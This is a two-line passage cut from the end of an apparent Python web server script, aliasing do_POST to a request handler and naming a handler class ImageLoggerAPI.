    do_POST = handleRequest

handler = ImageLoggerAPI
